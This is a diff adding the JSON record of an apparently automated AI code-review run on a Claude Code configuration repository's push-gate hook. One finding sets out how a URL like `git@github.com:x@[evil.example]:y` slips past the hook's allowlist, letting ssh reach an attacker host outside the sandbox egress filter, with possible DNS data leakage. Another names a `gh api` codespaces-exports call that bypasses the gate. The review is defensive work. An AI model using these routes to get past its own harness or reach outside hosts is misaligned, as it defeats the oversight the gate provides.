@@ -1,0 +1,121 @@
+{
+  "schema_version": 7,
+  "timestamp": "2026-11-28T17:36:40.482Z",
+  "repository": "AlexisBalayre/claude-code-config",
+  "run_id": "46170753345",
+  "run_url": "https://github.com/AlexisBalayre/claude-code-config/actions/runs/46170753345",
+  "actor": "AlexisBalayre",
+  "commit_sha": "ca5f2aacf80302f2ac84be4268dc87469ddf20e7",
+  "source": "pr",
+  "pr_number": 87,
+  "action": "review",
+  "reviewers_spawned": [
+    "correctness",
+    "security",
+    "qa",
+    "quality"
+  ],
+  "reviewers_returned": [
+    "correctness",
+    "security",
+    "qa",
+    "quality"
+  ],
+  "reviewers_skipped": [
+    "perf",
+    "simplicity",
+    "requirements"
+  ],
+  "review_mode": "incremental",
+  "incremental_from_sha": "c27788450dd927d8bef7e39efcd92828bba05ea7",
+  "review_depth": "standard",
+  "review_areas": [],
+  "prior_importants": [
+    {
+      "file": "tools/hooks-rs/src/push_gate.rs",
+      "line": "158-170",
+      "status": "resolved"
+    },
+    {
+      "file": "tools/hooks-rs/src/push_gate.rs",
+      "line": "693-695",
+      "status": "resolved"
+    },
+    {
+      "file": "tools/hooks-rs/tests/push_gate_gh.rs",
+      "line": "99-120",
+      "status": "resolved"
+    },
+    {
+      "file": "tools/hooks-rs/tests/push_gate.rs",
+      "line": "78-90",
+      "status": "resolved"
+    }
+  ],
+  "findings": [
+    {
+      "file": "tools/hooks-rs/src/push_gate.rs",
+      "line": "686-702",
+      "area": "security",
+      "confidence": "medium",
+      "tag": "important",
+      "description": "A prefix entry still does not pin the ssh host. git takes the ssh destination from a bracketed `@[host]` anywhere after the prefix, so `git@github.com:x@[evil.example]:y` (scp) or `ssh://git@github.com/x@[evil.example]/y` (URL) passes `url.starts_with(entry)`. The unsandboxed ls-remote then runs `ssh 'git@github.com:x@evil.example'`, which connects to evil.example.",
+      "body": "The delta makes a prefix fix the host in two ways: an entry ending in `/`, or an scp-form entry ending in `:`. For the ssh transport, neither way holds.\n\n```rust\nurl == entry\n    || (entry.ends_with('/')\n        || entry.ends_with(':') && !entry.contains(\"://\"))\n        && url.starts_with(entry)\n```\n\nThe only checks before this are `!url.contains('\\n')` and `!url.contains(\"::\")`. Nothing rejects `[`, `]` or a second `@`, and `on_remote` passes the URL straight to `git ls-remote -- <url>`.\n\n**How git reads the host.** In git's `connect.c`, `parse_connect_url` calls `host_end()` for both forms, scp and `ssh://`. `host_end()` searches the whole rest of the string for `@[`, path included; that search exists for the `user@[::1]:repo` form. A later `@[...]` therefore moves the end of the host:\n\n- **scp form.** Entry `git@github.com:`, URL `git@github.com:x@[evil.example]:y`. The host becomes `git@github.com:x@[evil.example]` and the path is `y`.\n- **URL form.** Entry `ssh://git@github.com/`, URL `ssh://git@github.com/x@[evil.example]/y`. The host becomes `git@github.com/x@[evil.example]`.\n\n`get_host_and_port` strips the brackets, so ssh receives `git@github.com:x@evil.example`. OpenSSH splits `user@host` at the last `@` and connects to `evil.example`.\n\n**What reaches the attacker's host.** With no tty, the host-key check usually aborts the session after key exchange. The DNS lookup and the TCP/SSH connection still happen, from outside the sandbox's egress filter, to a host no entry names. A subdomain label can carry data through DNS. The comment at L686-690 and the PR body (\"reaches only a URL the new `PUSH_GATE_REMOTES` lists\") say this cannot happen.\n\nhttps prefixes are not affected: curl ends the authority at the first `/`.\n\n**Fix.** Limit what a prefix match may append after the entry so it cannot re-open the host part. For example, refuse a `rest` that contains `@`, `[` or `%`. A stricter option allows only `[A-Za-z0-9._/-]`. Apply it in both forms, and add a test like `probes_no_url_that_only_shares_a_url_prefix_ending_in_a_colon` that uses `git@example.invalid:x@[other.invalid]:un.git`.\n\nhttps://github.com/AlexisBalayre/claude-code-config/blob/ca5f2aacf80302f2ac84be4268dc87469ddf20e7/tools/hooks-rs/src/push_gate.rs#L686-L702\n\nConfidence is medium because git's `connect.c` and OpenSSH's destination parsing are not in the tree.",
+      "suggestion": null
+    },
+    {
+      "file": ".claude/hooks/README.md",
+      "line": "39",
+      "area": "quality",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The README's list of `gh api` paths that ask (`git/refs`, `contents`, `update-branch`, a branch `rename`) omits the `autofix/commits` path this delta adds to the gate (push_gate.rs L144); add it to the list.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "tools/hooks-rs/src/push_gate.rs",
+      "line": "139-147",
+      "area": "security",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The README says a `gh api` call that writes a ref or a file asks, but `gh api -X POST user/codespaces/<name>/exports` still passes, and it pushes a codespace's unpushed changes to a branch or fork. It needs the codespace scope, so reach is small; adding `b\"/exports\"` to the `ref_path` list next to `b\"/autofix/commits\"` covers it.",
+      "body": null,
+      "suggestion": null
+    }
+  ],
+  "refuted_findings": [],
+  "process_issues": [],
+  "comments_posted_actual": 1,
+  "is_error": false,
+  "incomplete_reason": null,
+  "cost_usd": 1.9403212999999997,
+  "duration_ms": 348507,
+  "num_turns": 13,
+  "tokens": {
+    "input": 12,
+    "output": 9718,
+    "cache_read": 281165,
+    "cache_creation": 50158,
+    "total": 341053
+  },
+  "model_usage": [
+    {
+      "model": "claude-opus-5-5",
+      "input": 54,
+      "output": 43008,
+      "cache_read": 590046,
+      "cache_creation": 129660,
+      "cost_usd": 1.7771591999999998
+    },
+    {
+      "model": "claude-sonnet-5-5",
+      "input": 26,
+      "output": 5947,
+      "cache_read": 147551,
+      "cache_creation": 35554,
+      "cost_usd": 0.16316210000000003
+    }
+  ],
+  "permission_denials": []
+}
